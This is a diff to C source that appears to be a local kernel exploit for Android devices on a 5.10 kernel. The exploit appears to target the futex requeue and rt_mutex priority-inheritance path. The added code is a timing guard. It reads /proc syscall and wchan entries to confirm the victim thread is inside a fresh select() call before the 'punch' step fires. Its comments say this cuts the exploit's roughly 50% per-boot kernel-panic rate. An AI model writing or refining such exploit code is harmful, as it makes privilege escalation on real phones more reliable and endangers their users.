@@ -153,6 +153,7 @@ atomic_int owner_unlock_req;
 atomic_int owner_unlock_done;
 atomic_int requeue_done;
 atomic_int route_done;
+volatile long long g_select_start_us;
 atomic_int waiter_tid;
 /* Per-phase consumer nice: each walk must CHANGE the waiter task's prio,
  * or __sched_setscheduler returns early and rt_mutex_adjust_pi never runs. */
@@ -287,6 +288,63 @@ void *consumer_thread(void *arg __attribute__((unused))) {
            atomic_load(&punch_consume_go) == seq) {
       int delay_usec = atomic_load(&main_route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
+      /*
+       * WCAN/AGE WINDOW GUARD (BuSung q4q, SAME KMI 5.10.236-android12-9,
+       * real-device verified): "firing in the wrong window causes the
+       * fake-tree walk to crash" — the ~50% per-boot KP class. Only punch
+       * after the waiter is CONFIRMED inside select():
+       *   /proc/<tid>/syscall == SYS_select AND wchan == do_select,
+       *   3 consecutive confirmations, select age ≤ 150ms. On failure
+       * SKIP the arm (clean retry) instead of crashing the kernel.
+       * PSELECT_NO_WCHAN_GUARD=1 disables.
+       */
+      int window_ok = 0;
+      if (env_flag("PSELECT_NO_WCHAN_GUARD", 0)) {
+        window_ok = 1;
+      } else {
+        for (int g = 0; g < 64 && !window_ok; g++) {
+          int conf = 0;
+          for (int c = 0; c < 3; c++) {
+            char path[96], buf[160];
+            snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
+            int fd = open(path, O_RDONLY);
+            if (fd < 0) break;
+            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (n <= 0) break;
+            buf[n] = 0;
+            if (strtol(buf, NULL, 10) != __NR_pselect6) break;
+            snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+            fd = open(path, O_RDONLY);
+            if (fd < 0) break;
+            n = read(fd, buf, sizeof(buf) - 1);
+            close(fd);
+            if (n <= 0) break;
+            buf[n] = 0;
+            if (strncmp(buf, "do_select", 9) != 0) break;
+            conf++;
+          }
+          if (conf == 3) {
+            long long started = g_select_start_us;
+            if (started > 0) {
+              struct timespec gnow;
+              clock_gettime(CLOCK_MONOTONIC, &gnow);
+              long long age = (long long)gnow.tv_sec * 1000000LL +
+                              gnow.tv_nsec / 1000 - started;
+              if (age <= 150000LL) window_ok = 1;
+              break; /* in select: fresh → punch; stale → skip */
+            }
+          }
+          usleep(3000);
+        }
+      }
+      if (!window_ok) {
+        pr_info("consumer window-guard SKIP seq=%d tid=%d (not in fresh "
+                "select window — clean retry)\n",
+                seq, tid);
+        atomic_store(&punch_consume_go, 0);
+        break;
+      }
       for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
